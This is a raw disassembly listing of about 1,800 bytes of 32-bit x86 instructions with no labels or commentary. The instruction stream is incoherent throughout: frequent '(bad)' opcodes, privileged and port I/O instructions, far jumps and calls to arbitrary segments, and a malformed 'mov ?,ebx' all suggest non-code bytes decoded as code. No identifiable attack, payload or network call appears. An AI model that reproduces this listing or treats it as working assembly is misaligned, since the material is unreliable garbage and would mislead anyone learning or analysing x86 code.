  415b40:	jno    0x415b63
  415b42:	add    al,0x5f
  415b44:	inc    eax
  415b45:	inc    edx
  415b46:	cdq    
  415b47:	ficomp WORD PTR [ebx-0xb919b97]
  415b4d:	or     ecx,ebx
  415b4f:	sub    cl,bl
  415b51:	ficomp WORD PTR [eax-0xb]
  415b54:	add    al,BYTE PTR [edi+0x36]
  415b57:	and    dh,dl
  415b59:	add    bl,BYTE PTR ds:0x170bc260
  415b5f:	rol    esp,1
  415b61:	push   ds
  415b62:	push   edi
  415b63:	add    eax,0x1b287ba9
  415b68:	jae    0x415ba5
  415b6a:	stc    
  415b6b:	mov    esp,0x3b1cb449
  415b70:	mov    DWORD PTR [edi-0x5df74d4f],esp
  415b76:	and    bl,dl
  415b78:	aaa    
  415b79:	xchg   ebp,eax
  415b7a:	and    BYTE PTR [ebx],dh
  415b7c:	jmp    0x4fa149c7
  415b81:	outs   dx,BYTE PTR ds:[esi]
  415b82:	pop    eax
  415b83:	push   cs
  415b84:	jae    0x415bfc
  415b86:	mov    esi,cr6
  415b89:	ret    0xe448
  415b8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b8d:	enter  0x7ad4,0xba
  415b91:	xor    al,0x20
  415b93:	mov    edi,0xbcda9519
  415b98:	inc    ebx
  415b99:	stos   DWORD PTR es:[edi],eax
  415b9a:	nop
  415b9b:	lods   eax,DWORD PTR ds:[esi]
  415b9c:	mov    ecx,0xda5d4891
  415ba1:	push   ss
  415ba2:	cmp    DWORD PTR [ebx],eax
  415ba4:	rcl    BYTE PTR gs:[edi+0x52],0x8e
  415ba9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415baa:	fwait
  415bab:	adc    al,0x8
  415bad:	leave  
  415bae:	fsubr  QWORD PTR [esi-0x1f]
  415bb1:	sbb    al,0x17
  415bb3:	bound  esp,QWORD PTR [ebp+0x78]
  415bb6:	pusha  
  415bb7:	stos   BYTE PTR es:[edi],al
  415bb8:	cwde   
  415bb9:	sbb    dh,BYTE PTR [eax+edx*8+0x482e34ec]
  415bc0:	mul    DWORD PTR [ecx+eax*4+0x3d]
  415bc4:	jle    0x415b89
  415bc6:	dec    esi
  415bc7:	jle    0x415c28
  415bc9:	sbb    BYTE PTR [ecx],ah
  415bcb:	fadd   DWORD PTR [ecx+0x55a7e702]
  415bd1:	dec    ebx
  415bd2:	pop    edx
  415bd3:	mov    esi,0x3346b9f7
  415bd8:	retf   
  415bd9:	jno    0x415c4f
  415bdb:	hlt    
  415bdc:	xchg   DWORD PTR ss:[ecx+0x58],esi
  415be0:	pop    ss
  415be1:	daa    
  415be2:	(bad)  
  415be3:	popf   
  415be4:	int    0x36
  415be6:	cmc    
  415be7:	mov    edx,0x8b971fda
  415bec:	push   es
  415bed:	or     dh,BYTE PTR [esi-0x11]
  415bf0:	xor    eax,0x564cbcf0
  415bf5:	pop    esi
  415bf6:	cmc    
  415bf7:	arpl   WORD PTR [esi+0x18],cx
  415bfa:	shr    DWORD PTR [ebx+0x74e4e3dc],1
  415c00:	push   ss
  415c01:	mov    edi,0x6a00bde1
  415c06:	popf   
  415c07:	nop
  415c08:	push   ebx
  415c09:	aas    
  415c0a:	imul   edi,DWORD PTR cs:[ebp+0x225bc755],0x1d
  415c12:	ins    DWORD PTR es:[edi],dx
  415c13:	into   
  415c14:	jp     0x415c80
  415c16:	push   ecx
  415c17:	push   esp
  415c18:	jmp    0x853f2b57
  415c1d:	pusha  
  415c1e:	out    0x8c,eax
  415c20:	shr    DWORD PTR [esi],0xc
  415c23:	test   al,0x1f
  415c25:	fstp   TBYTE PTR [ecx-0x56]
  415c28:	sbb    dl,BYTE PTR [esi+0x2013bb79]
  415c2e:	(bad)  
  415c2f:	mov    esp,0xdd5c9844
  415c34:	pop    edi
  415c35:	sub    ecx,DWORD PTR [ecx]
  415c37:	icebp  
  415c38:	xchg   esp,eax
  415c39:	rcl    bl,cl
  415c3b:	mov    edx,edx
  415c3d:	(bad)  
  415c3e:	jae    0x415c69
  415c40:	dec    edi
  415c41:	in     eax,dx
  415c42:	xor    BYTE PTR [ebx],dh
  415c44:	jno    0x415c27
  415c46:	(bad)  
  415c48:	aaa    
  415c49:	mov    bh,0xf8
  415c4b:	stc    
  415c4c:	sar    DWORD PTR [edx+esi*4-0x3450659c],1
  415c53:	jge    0x415cad
  415c55:	mov    BYTE PTR [edi-0x1],dh
  415c58:	dec    esp
  415c59:	es mov eax,fs
  415c5c:	sub    eax,0x6b96bf58
  415c61:	or     BYTE PTR [ebx],0x10
  415c64:	adc    eax,0xcd36637d
  415c69:	icebp  
  415c6a:	and    eax,0x42e80f0
  415c6f:	cld    
  415c70:	sub    dh,BYTE PTR [ebx]
  415c72:	imul   ebx,DWORD PTR ds:[ebp-0x3fcc9632],0xc5d20e6c
  415c7d:	mov    esp,0xe48c3823
  415c82:	and    al,0xde
  415c84:	push   ebx
  415c85:	aaa    
  415c86:	xchg   ebx,eax
  415c87:	nop
  415c88:	jp     0x415cec
  415c8a:	loopne 0x415c6a
  415c8c:	sar    BYTE PTR [edx-0xf],cl
  415c8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c90:	adc    al,BYTE PTR [eax+0x646dfde1]
  415c96:	jg     0x415c6d
  415c98:	pop    edi
  415c99:	jbe    0x415d10
  415c9b:	mov    al,ds:0xcb3187af
  415ca0:	popf   
  415ca1:	mov    DWORD PTR [eax],edi
  415ca3:	mov    esp,0x241c0d91
  415ca8:	fild   WORD PTR [edx-0x31]
  415cab:	xchg   edi,eax
  415cac:	jl     0x415c32
  415cae:	data16 data16 in al,dx
  415cb1:	cwde   
  415cb2:	xor    dl,bl
  415cb4:	push   ecx
  415cb5:	and    al,0x24
  415cb7:	mov    esp,0xb4808011
  415cbc:	sub    al,0xcb
  415cbe:	pop    ebx
  415cbf:	push   cs
  415cc0:	enter  0xd613,0xb3
  415cc4:	cli    
  415cc5:	pop    edi
  415cc6:	rcr    DWORD PTR [esp+edi*1],cl
  415cc9:	repnz inc edi
  415ccb:	lods   al,BYTE PTR ds:[esi]
  415ccc:	sbb    DWORD PTR [ebp-0x4236fe16],esi
  415cd2:	push   0xffffffed
  415cd4:	mov    ah,0xa5
  415cd6:	add    eax,0x3f5e7c10
  415cdb:	(bad)  
  415cdc:	mov    eax,0x1f657e28
  415ce1:	outs   dx,DWORD PTR ds:[esi]
  415ce2:	fprem1 
  415ce4:	jmp    0x1f906c6b
  415ce9:	mov    dh,0x37
  415ceb:	pop    edx
  415cec:	stc    
  415ced:	jae    0x415d11
  415cef:	xchg   ebx,eax
  415cf0:	sbb    al,BYTE PTR [ecx]
  415cf2:	mov    edx,0x16ecf6a4
  415cf7:	jb     0x415cf4
  415cf9:	or     al,0x81
  415cfb:	sbb    edi,DWORD PTR [ebx-0xf6b2d70]
  415d01:	jmp    DWORD PTR [ecx]
  415d03:	jle    0x415d62
  415d05:	push   0x26e7d45b
  415d0a:	dec    esi
  415d0b:	sub    eax,0x5ae888f7
  415d10:	loop   0x415d61
  415d12:	inc    ecx
  415d13:	repz imul BYTE PTR fs:[edx]
  415d17:	retf   
  415d18:	fdivr  QWORD PTR [eax+0x13]
  415d1b:	outs   dx,BYTE PTR ds:[esi]
  415d1c:	sub    DWORD PTR [edx],0x48
  415d1f:	pop    es
  415d20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d21:	jmp    0x207b:0x5b9dc3fe
  415d28:	cwde   
  415d29:	repz idiv DWORD PTR [ebx+0xf03909b]
  415d30:	cld    
  415d31:	pop    edx
  415d32:	(bad)  
  415d33:	pop    esp
  415d34:	(bad)  
  415d36:	mov    ds:0xd5366782,al
  415d3b:	sbb    dh,BYTE PTR [ebp+0x287fc5ee]
  415d41:	pop    ss
  415d42:	mov    DWORD PTR [edi],eax
  415d44:	rcr    ah,1
  415d46:	or     cl,ah
  415d48:	xchg   edx,eax
  415d49:	ss jle 0x415d31
  415d4c:	aas    
  415d4d:	nop
  415d4e:	jae    0xad92f5d8
  415d54:	inc    esp
  415d55:	imul   edi,eax,0xe85a212f
  415d5b:	pop    ss
  415d5c:	fs into 
  415d5e:	repz stc 
  415d60:	mov    cl,0x95
  415d62:	sbb    al,0x7b
  415d64:	jmp    0x3763:0xeb2fa1e0
  415d6b:	and    eax,0x6c9685b4
  415d70:	cdq    
  415d71:	and    DWORD PTR [ebp+0x54],eax
  415d74:	aam    0xf1
  415d76:	push   esp
  415d77:	add    DWORD PTR [eax],esp
  415d79:	or     BYTE PTR [ebx],ch
  415d7b:	xchg   ebp,eax
  415d7c:	fstp   DWORD PTR [esi+0x7b]
  415d7f:	imul   ecx,DWORD PTR [edx+0x6a5d5be8],0x2b49760d
  415d89:	add    al,0x4d
  415d8b:	jg     0x415d65
  415d8d:	jmp    0xbef8:0xcf05c60d
  415d94:	xchg   DWORD PTR [ebx],edi
  415d96:	(bad)
  415d99:	repz fadd st(4),st
  415d9c:	imul   eax,edx,0x6d1b68c2
  415da2:	les    ecx,FWORD PTR [edi]
  415da4:	adc    ah,BYTE PTR [edx+0x7b65f6e9]
  415daa:	xchg   BYTE PTR [edx-0x43],dh
  415dad:	mov    al,0x18
  415daf:	xlat   BYTE PTR ds:[ebx]
  415db0:	nop
  415db1:	lea    esi,[edi]
  415db3:	xchg   edi,eax
  415db4:	rol    BYTE PTR [eax],0x67
  415db7:	xor    cl,BYTE PTR [edi-0x32]
  415dba:	fs pop ebp
  415dbc:	shr    BYTE PTR ds:0xdd6ea223,1
  415dc2:	iret   
  415dc3:	es in  eax,dx
  415dc5:	mov    eax,0xb52a0c6c
  415dca:	cmp    DWORD PTR [esi-0x32c69049],0x7611006e
  415dd4:	fdivr  DWORD PTR [esi-0x15]
  415dd7:	inc    ecx
  415dd8:	and    al,0xa1
  415dda:	xchg   esp,eax
  415ddb:	ins    DWORD PTR es:[edi],dx
  415ddc:	(bad)  
  415ddd:	(bad)  
  415dde:	pop    ss
  415ddf:	nop
  415de0:	xor    DWORD PTR [ebp-0x20],esp
  415de3:	and    edx,DWORD PTR gs:[ebp+0x69]
  415de7:	sar    ebx,0x28
  415dea:	cmp    ebx,DWORD PTR [edi-0x6e]
  415ded:	call   0xa62a64f3
  415df2:	adc    BYTE PTR [esi-0x5868c68c],bh
  415df8:	dec    edx
  415df9:	adc    BYTE PTR gs:[ecx],bh
  415dfc:	(bad)  
  415dfd:	(bad)  
  415dfe:	jmp    0x2779:0xac32759f
  415e05:	leave  
  415e06:	shl    bh,cl
  415e08:	mov    ecx,DWORD PTR [ebp+0x359b745b]
  415e0e:	outs   dx,DWORD PTR ds:[esi]
  415e0f:	jb     0x415e3b
  415e11:	dec    edx
  415e12:	fdiv   DWORD PTR [ebx]
  415e14:	call   0xc7df61be
  415e19:	push   0x76134e64
  415e1e:	scas   al,BYTE PTR es:[edi]
  415e1f:	xlat   BYTE PTR ds:[ebx]
  415e20:	(bad)
  415e24:	call   eax
  415e26:	ret    0x7329
  415e29:	xor    al,0x71
  415e2b:	sub    BYTE PTR [ebp+0x37],dh
  415e2e:	xchg   ebp,eax
  415e2f:	ror    BYTE PTR [edi+ebx*2-0x4c],1
  415e33:	mov    ?,ebx
  415e35:	aaa    
  415e36:	repnz add ebp,ecx
  415e39:	mov    gs,WORD PTR [edx-0x52]
  415e3c:	push   es
  415e3d:	jnp    0x415de4
  415e3f:	sti    
  415e40:	jmp    0x415dcb
  415e42:	jns    0x415eb5
  415e44:	adc    eax,0x3df89fc5
  415e49:	arpl   WORD PTR [edi-0x73],bx
  415e4c:	jns    0x415e39
  415e4e:	sub    BYTE PTR [ebp+0x6857c76],bh
  415e54:	fcom   QWORD PTR [ecx-0x75ef24b5]
  415e5a:	mov    ecx,0x6c0be46b
  415e5f:	mov    DWORD PTR [edi],esp
  415e61:	inc    ebx
  415e62:	(bad)  
  415e63:	int    0x9a
  415e65:	push   0x62
  415e67:	sbb    BYTE PTR [edi-0x26251588],0x47
  415e6e:	scas   eax,DWORD PTR es:[edi]
  415e6f:	and    eax,0xc753efc
  415e74:	sti    
  415e75:	jmp    0xace072ed
  415e7a:	stc    
  415e7b:	shl    DWORD PTR [ebp+0x3e533808],cl
  415e81:	mov    ebp,DWORD PTR [edx-0x637ff2e9]
  415e87:	pop    ecx
  415e88:	je     0x415e37
  415e8a:	jns    0x415e41
  415e8c:	outs   dx,DWORD PTR ds:[esi]
  415e8d:	fwait
  415e8e:	sar    BYTE PTR [ebx],1
  415e90:	push   eax
  415e91:	mov    ch,0xfa
  415e93:	jmp    0xa270:0x117212cd
  415e9a:	adc    BYTE PTR [ebx+0x38],bl
  415e9d:	loop   0x415e77
  415e9f:	ins    BYTE PTR es:[edi],dx
  415ea0:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  415ea2:	ret    
  415ea3:	add    al,0xb3
  415ea5:	and    ecx,DWORD PTR ds:0xd4132940
  415eab:	mov    esp,0xa0475fbf
  415eb0:	rol    DWORD PTR [esi+0x71c02502],0xc5
  415eb7:	mov    ebx,0x5c83aaa0
  415ebc:	add    eax,0x5f775854
  415ec1:	cwde   
  415ec2:	aam    0xf8
  415ec4:	adc    BYTE PTR [eax-0x8],al
  415ec7:	retf   
  415ec8:	cmp    BYTE PTR [esi],dh
  415eca:	pop    ecx
  415ecb:	rol    DWORD PTR [ebp+ebp*4-0x71],0xe6
  415ed0:	cs push edx
  415ed2:	iret   
  415ed3:	fisub  DWORD PTR [ecx+0x2]
  415ed6:	scas   eax,DWORD PTR es:[edi]
  415ed7:	inc    DWORD PTR [ebx]
  415ed9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415eda:	jnp    0x415e6b
  415edc:	mov    al,0x84
  415ede:	xor    ch,BYTE PTR [edx-0x41]
  415ee1:	and    DWORD PTR [edi],ecx
  415ee3:	mov    dl,0x5e
  415ee5:	jns    0x415f44
  415ee7:	and    eax,0x97be38ed
  415eec:	or     ch,0xec
  415eef:	test   al,0xd5
  415ef1:	or     al,0xa9
  415ef3:	dec    edx
  415ef4:	(bad)  
  415ef6:	sub    ah,BYTE PTR [edi]
  415ef8:	dec    edi
  415ef9:	aas    
  415efa:	popf   
  415efb:	cmp    BYTE PTR [eax+0x25],cl
  415efe:	rcl    DWORD PTR [eax-0x377dd390],cl
  415f04:	sbb    al,0x50
  415f06:	cld    
  415f07:	ror    edi,1
  415f09:	(bad)  
  415f0a:	or     eax,0x1a34c42a
  415f0f:	jmp    0x8127f767
  415f14:	jecxz  0x415f85
  415f16:	inc    BYTE PTR ds:0xe2800110
  415f1c:	mov    al,0x66
  415f1e:	cdq    
  415f1f:	shl    bl,cl
  415f21:	cmp    DWORD PTR [edi-0x16],esp
  415f24:	pop    ss
  415f25:	data16 lods al,BYTE PTR ds:[esi]
  415f27:	jle    0x415ef5
  415f29:	popf   
  415f2a:	imul   edi,DWORD PTR [edx+0x5af2b7ff],0x5680d5e5
  415f34:	jge    0x415f3f
  415f36:	mov    ebx,0x555f0919
  415f3b:	sub    BYTE PTR [esi-0x2c7ba1d2],al
  415f41:	scas   eax,DWORD PTR es:[edi]
  415f42:	out    0x90,al
  415f44:	mov    esi,0xb6990dea
  415f49:	mov    al,ds:0x94a0bf74
  415f4e:	ja     0x415f07
  415f50:	fisub  WORD PTR [esp+eiz*8]
  415f53:	inc    ecx
  415f54:	jmp    0x415ee9
  415f56:	dec    ecx
  415f57:	xchg   BYTE PTR [edx+0x57f4eca6],bl
  415f5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f5e:	sub    ecx,ecx
  415f60:	fdivr  DWORD PTR [eax+0x5c2a5526]
  415f66:	daa    
  415f67:	arpl   bx,si
  415f69:	adc    ah,BYTE PTR [edi]
  415f6b:	ror    BYTE PTR [ebp-0x2462889e],cl
  415f71:	pause  
  415f73:	jp     0x415f97
  415f75:	fsubr  DWORD PTR [edx]
  415f77:	fild   DWORD PTR [ebx+ebx*8]
  415f7a:	retf   
  415f7b:	(bad)  
  415f7c:	push   0xffffffba
  415f7e:	sbb    BYTE PTR [ebp-0xc],0x20
  415f82:	xor    eax,0x7f73a430
  415f87:	adc    eax,0x43311451
  415f8c:	mov    eax,0x1c24b4bc
  415f91:	mov    ds,WORD PTR [ebp-0x80]
  415f94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f95:	fistp  DWORD PTR ds:0x4c5b146c
  415f9b:	cmp    esi,ecx
  415f9d:	adc    cl,bl
  415f9f:	outs   dx,DWORD PTR ds:[esi]
  415fa0:	stos   DWORD PTR es:[edi],eax
  415fa1:	into   
  415fa2:	in     eax,0x30
  415fa4:	dec    ebx
  415fa5:	aas    
  415fa6:	push   ebp
  415fa7:	adc    al,0x29
  415fa9:	xor    al,0x53
  415fab:	sbb    ch,BYTE PTR [ebx]
  415fad:	jns    0x415ffa
  415faf:	cs stos DWORD PTR es:[edi],eax
  415fb1:	xor    BYTE PTR [ebx],0x75
  415fb4:	popa   
  415fb5:	js     0x415f47
  415fb7:	(bad)  
  415fb8:	xchg   ecx,eax
  415fb9:	mov    eax,ds:0xba2d7f46
  415fbe:	stos   DWORD PTR es:[edi],eax
  415fbf:	ja     0x415fe6
  415fc1:	or     DWORD PTR [edi+0x7109222c],edx
  415fc7:	xchg   ebx,eax
  415fc8:	lds    ecx,FWORD PTR [eax-0xf8832d7]
  415fce:	daa    
  415fcf:	dec    edi
  415fd0:	push   cs
  415fd1:	adc    DWORD PTR [eax+0x417b81df],ebx
  415fd7:	xchg   esi,eax
  415fd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415fd9:	inc    eax
  415fda:	jl     0x415fe3
  415fdc:	repz xor eax,0x99038982
  415fe2:	jp     0x416014
  415fe4:	adc    eax,0x51de53b6
  415fe9:	add    eax,DWORD PTR [ebp+0x21]
  415fec:	in     al,0xca
  415fee:	jmp    0x634c1d2d
  415ff3:	mov    ecx,0xd536dac9
  415ff8:	sub    eax,0xe192e21a
  415ffd:	xchg   ecx,eax
  415ffe:	(bad)  
  415fff:	shr    DWORD PTR [edi-0x75bfde67],1
  416005:	and    edx,DWORD PTR [edx+edx*8+0x7ef4e941]
  41600c:	stc    
  41600d:	scas   al,BYTE PTR es:[edi]
  41600e:	ins    DWORD PTR es:[edi],dx
  41600f:	(bad)  
  416010:	std    
  416011:	aad    0x10
  416013:	xchg   ebx,eax
  416014:	loop   0x415fe0
  416016:	lea    edx,[ecx]
  416018:	pop    edx
  416019:	lock jmp 0xb0f4:0x20f240de
  416021:	daa    
  416022:	adc    BYTE PTR [edx-0x1d048ffd],dh
  416028:	pop    ebx
  416029:	stos   BYTE PTR es:[edi],al
  41602a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41602b:	test   eax,0xf1060d28
  416030:	mov    ecx,0xd8041dac
  416035:	jmp    0x749da157
  41603a:	push   0x5b1999d9
  41603f:	outs   dx,BYTE PTR ds:[esi]
  416040:	jno    0x41608a
  416042:	lock leave 
  416044:	mov    esi,edx
  416046:	add    eax,0x5da55150
  41604b:	in     al,0x52
  41604d:	cmp    BYTE PTR [eax+0x75],bl
  416050:	jbe    0x4160a0
  416052:	mov    cl,0xf0
  416054:	gs jge 0x415fe5
  416057:	push   esi
  416058:	and    DWORD PTR [eax-0x3a],ebx
  41605b:	add    DWORD PTR [ecx+ebp*2-0x2b],ecx
  41605f:	imul   ebx,DWORD PTR [eax+eiz*1+0x6e],0x500a1d9a
  416067:	and    eax,0x28a7b562
  41606c:	sbb    eax,0x7b6843ef
  416071:	cli    
  416072:	xor    eax,0xcb2c7c24
  416077:	or     DWORD PTR [ebp+0x2a],esi
  41607a:	leave  
  41607b:	xchg   BYTE PTR [eax+0x5f6f6e7],ch
  416081:	cdq    
  416082:	cwde   
  416083:	sub    ch,BYTE PTR [ebx]
  416085:	adc    edi,esi
  416087:	mov    eax,0x627f5775
  41608c:	cmp    esp,DWORD PTR [esi-0x3389cb96]
  416092:	loop   0x4160c2
  416094:	sub    eax,0xc0f9d182
  416099:	pop    ebp
  41609a:	cmp    eax,0xf27b80d
  41609f:	pslld  mm1,QWORD PTR [edi]
  4160a2:	or     ebx,eax
  4160a4:	jg     0x416070
  4160a6:	pop    esp
  4160a7:	jnp    0x4160f3
  4160a9:	pop    ds
  4160aa:	and    ebx,DWORD PTR [ebx+0x1f]
  4160ad:	mov    dl,cl
  4160af:	test   BYTE PTR [edx+eax*2],dl
  4160b2:	mov    ebx,ebx
  4160b4:	push   ebx
  4160b5:	xchg   edi,eax
  4160b6:	jo     0x4160d5
  4160b8:	push   edx
  4160b9:	popa   
  4160ba:	ds (bad) 
  4160bc:	jb     0x416106
  4160be:	cmp    edi,ebx
  4160c0:	mov    edi,0x68172541
  4160c5:	push   edx
  4160c6:	jmp    0xe76007b
  4160cb:	push   ds
  4160cc:	mov    ecx,0x1008524d
  4160d1:	shl    DWORD PTR [ebp+0xe9fa2a8],1
  4160d7:	fsub   QWORD PTR [esi+edi*2-0x1346abd2]
  4160de:	cwde   
  4160df:	outs   dx,BYTE PTR ds:[esi]
  4160e0:	jnp    0x416104
  4160e2:	iret   
  4160e3:	or     DWORD PTR [edx-0x45],ebx
  4160e6:	pminsw mm1,mm5
  4160e9:	ret    0x1846
  4160ec:	out    0xe0,al
  4160ee:	jle    0x4160c0
  4160f0:	sbb    BYTE PTR [edx],dh
  4160f2:	adc    al,0xdc
  4160f4:	adc    al,0xa7
  4160f6:	and    BYTE PTR [edx+0x22f70dcc],dl
  4160fc:	sub    esp,DWORD PTR [edi-0x537aaa1e]
  416102:	inc    ecx
  416103:	aam    0xbd
  416105:	cmp    al,0x68
  416107:	or     DWORD PTR [ebp+edi*4+0x60b2fb76],edx
  41610e:	repz sbb cl,BYTE PTR [edx-0x16a0bde9]
  416115:	push   eax
  416116:	(bad)  
  416117:	sar    esi,0x27
  41611a:	inc    eax
  41611b:	aad    0xd8
  41611d:	ss mov edi,edx
  416120:	pop    es
  416121:	ins    BYTE PTR es:[edi],dx
  416122:	js     0x4160a7
  416124:	lds    edi,FWORD PTR [ebx]
  416126:	int    0x80
  416128:	in     al,0xf2
  41612a:	dec    esp
  41612b:	mov    edi,0x38158309
  416130:	scas   al,BYTE PTR es:[edi]
  416131:	add    dh,bl
  416133:	outs   dx,DWORD PTR ds:[esi]
  416134:	jo     0x41619b
  416136:	push   0x567f69dd
  41613b:	mov    bh,0xd2
  41613d:	xor    edi,DWORD PTR [esi-0x35]
  416140:	xchg   esi,eax
  416141:	or     eax,0xe834a62a
  416147:	ficomp WORD PTR [edx+0x2f464f7c]
  41614d:	pop    esp
  41614e:	dec    edx
  41614f:	pusha  
  416150:	sub    DWORD PTR [esi+0x34644ba7],ebx
  416156:	sub    DWORD PTR [edi],0x7e
  416159:	adc    eax,0xb0f03e08
  41615e:	ror    DWORD PTR [ebp-0x35415cb0],cl
  416164:	retf   0x1f6
  416167:	retf   
  416168:	fs push cs
  41616a:	push   ds
  41616b:	cmp    dl,BYTE PTR [eax+0xf]
  41616e:	mov    bh,0xd5
  416170:	ins    DWORD PTR es:[edi],dx
  416171:	dec    DWORD PTR [ebx]
  416173:	imul   edx,DWORD PTR [eax-0x5369f7bc],0x30a3e878
  41617d:	leave  
  41617e:	or     esi,0x4c
  416181:	lea    esi,[eax+0x55ddf69b]
  416187:	arpl   cx,sp
  416189:	(bad)  
  41618a:	and    cl,al
  41618c:	iret   
  41618d:	sub    cl,bh
  41618f:	repnz dec ebx
  416191:	dec    ecx
  416192:	jae    0x416123
  416194:	stos   DWORD PTR es:[edi],eax
  416195:	or     BYTE PTR ds:0xf98a03cd,cl
  41619b:	out    dx,eax
  41619c:	sub    eax,0x9a6d379b
  4161a1:	mov    WORD PTR [edi],cs
  4161a3:	enter  0x3526,0xc0
  4161a7:	imul   BYTE PTR [edi-0x503eb48c]
  4161ad:	or     DWORD PTR [esi-0x7b],esi
  4161b0:	and    BYTE PTR [ebp+0x4c3d8b02],ah
  4161b6:	repz xchg esp,eax
  4161b8:	xchg   esi,eax
  4161b9:	(bad)  
  4161ba:	ficomp DWORD PTR [ebx+0x2]
  4161bd:	fst    st(4)
  4161bf:	jno    0x4161ec
  4161c1:	addr16 enter 0xa85a,0x94
  4161c6:	fldcw  WORD PTR [esi+0x78619889]
  4161cc:	iret   
  4161cd:	mov    ds:0x7ad4c9ab,al
  4161d2:	outs   dx,DWORD PTR ds:[esi]
  4161d3:	xchg   edx,eax
  4161d4:	shl    DWORD PTR [ecx-0x40],1
  4161d7:	scas   al,BYTE PTR es:[edi]
  4161d8:	mov    al,ds:0x1c7f83c9
  4161dd:	enter  0x5f52,0xb0
  4161e1:	sub    BYTE PTR [ebx+0x5e],bl
  4161e4:	(bad)  
  4161e5:	daa    
  4161e6:	inc    edx
  4161e7:	pop    ss
  4161e8:	jno    0x41618a
  4161ea:	call   0xa1a7ba59
  4161ef:	dec    ebx
  4161f0:	jge    0x4161f0
  4161f2:	cmp    dl,cl
  4161f4:	xchg   esp,eax
  4161f5:	ds push edx
  4161f7:	cmp    DWORD PTR [eax-0x5ac4a9c9],ebp
  4161fd:	leave  
  4161fe:	xchg   esp,ecx
  416200:	aam    0x61
  416202:	popa   
  416203:	sub    ebp,edi
  416205:	xchg   edx,eax
  416206:	fs aam 0x72
  416209:	jo     0x41625b
  41620b:	scas   eax,DWORD PTR es:[edi]
  41620c:	jns    0x4161df
  41620e:	icebp  
  41620f:	mov    ebp,0x64fd7161
  416214:	mov    ds:0x569b0028,eax
  416219:	fisub  WORD PTR ds:0xe33bf8e0
  41621f:	xchg   edi,eax
  416220:	pop    es
  416221:	push   0x2b
  416223:	dec    dh
  416225:	pop    esi
  416226:	call   0xda22:0xe3592ed
  41622d:	call   0x82bc:0x76d631f2
  416234:	in     eax,0x1
  416236:	ror    BYTE PTR ds:0x305815ac,1
  41623c:	sub    DWORD PTR [edx+eax*4],esp
  41623f:	or     eax,0xf42e634
  416244:	mov    esp,0x23059bb1
  416249:	rcl    BYTE PTR [esi],1
  41624b:	cmp    eax,0x9b9acfa9
  416250:	test   BYTE PTR [ebp+ebx*2+0x56],bh
  416254:	sub    BYTE PTR [eax],0x50
  416257:	and    al,0xef
  416259:	stos   DWORD PTR es:[edi],eax
  41625a:	into   
  41625b:	clc    
  41625c:	repnz push 0x5f7ba8ba
  416262:	popa   
  416263:	aas    
  416264:	sbb    BYTE PTR [ebp+0x5a],ah
  416267:	(bad)  
  416268:	sbb    DWORD PTR [esi-0x2f44f485],ebp
  41626e:	xchg   ebp,eax
  41626f:	sti    
  416270:	enter  0xfc27,0x56
  416274:	fistp  DWORD PTR [edi-0x170d7642]
  41627a:	jmp    0x5e3e39b8
  41627f:	mov    WORD PTR [edx+edi*1],gs
  416282:	sti    
  416283:	out    0x2f,eax
  416285:	adc    al,0x49
  416287:	push   ebp
  416288:	lock mov bh,0x3f
  41628b:	xor    cl,BYTE PTR [esi-0x6c]
  41628e:	push   esi
  41628f:	stos   DWORD PTR es:[edi],eax
  416290:	mov    ebx,DWORD PTR [ebx-0x7efe9f12]
  416296:	ror    DWORD PTR [ecx],cl
  416298:	leave  
  416299:	pushf  
  41629a:	(bad)  
  41629b:	in     al,0x54
  41629d:	stc    
  41629e:	enter  0xfb9d,0xeb
  4162a2:	gs sbb bh,al
  4162a5:	ds inc esp
  4162a7:	push   esp
  4162a8:	add    edx,DWORD PTR [edi-0x8]
  4162ab:	sahf   
  4162ac:	pop    ebx
  4162ad:	ss out dx,al
  4162af:	push   0xbb8de966
  4162b4:	out    dx,eax
  4162b5:	mov    dh,0x90
  4162b7:	not    esp
  4162b9:	adc    BYTE PTR [ebp+0x79daa701],ah
  4162bf:	dec    esi
  4162c0:	in     al,dx
  4162c1:	jne    0x416256
  4162c3:	addr16 mov ecx,0xefbf320c
  4162c9:	iret   
  4162ca:	dec    esi
  4162cb:	sbb    eax,0x9ec46075
  4162d0:	dec    ebp
  4162d1:	jno    0x4162d9
  4162d3:	imul   edi,DWORD PTR [edx],0x2a
  4162d6:	fwait
  4162d7:	lock xor eax,0x40ca943c
  4162dd:	lahf   
  4162de:	inc    esi
  4162df:	inc    ecx
  4162e0:	jle    0x41631f
  4162e2:	es inc esp
  4162e4:	or     DWORD PTR ss:[edx+eax*1],ecx
  4162e8:	push   ss
  4162e9:	fsubr  DWORD PTR [ecx+0x5845ec80]
  4162ef:	iret   
  4162f0:	cdq    
  4162f1:	loop   0x416372
  4162f3:	out    dx,al
  4162f4:	xchg   esi,eax
  4162f5:	bnd jp 0x41633f
  4162f8:	or     al,bh
  4162fa:	xchg   esi,eax
  4162fb:	jbe    0x4162b0
  4162fd:	mov    cl,0x4d
  4162ff:	std    
  416300:	add    ebx,eax
  416302:	sti    
  416303:	ins    BYTE PTR es:[edi],dx
  416304:	xchg   DWORD PTR [esp+eiz*2-0x3f],ebp
  416308:	fwait
  416309:	dec    esi
  41630a:	jno    0x416296
  41630c:	scas   eax,DWORD PTR es:[edi]
  41630d:	adc    BYTE PTR [esi+0xd39864e],ah
  416313:	adc    al,BYTE PTR ds:0x3a4c15ef
  416319:	pushf  
  41631a:	out    0xbe,eax
  41631c:	mov    edi,0x1e641042
  416321:	pop    cx
  416323:	call   0x765c:0x1a4749f3
  41632a:	adc    dl,dl
  41632c:	mov    al,ds:0x1881432f
  416331:	into   
  416332:	mov    fs,esi
  416334:	pop    ebx
  416335:	sar    BYTE PTR [esi-0x74],0x3
  416339:	iret   
  41633a:	movhps xmm0,QWORD PTR [edx+ebx*2-0x3d06fb39]
  416342:	adc    al,0x9d
  416344:	cwde   
  416345:	ret    
  416346:	shr    DWORD PTR [edi+0xe9f477d],1
  41634c:	jle    0x416303
  41634e:	cmp    eax,0x81c876e0
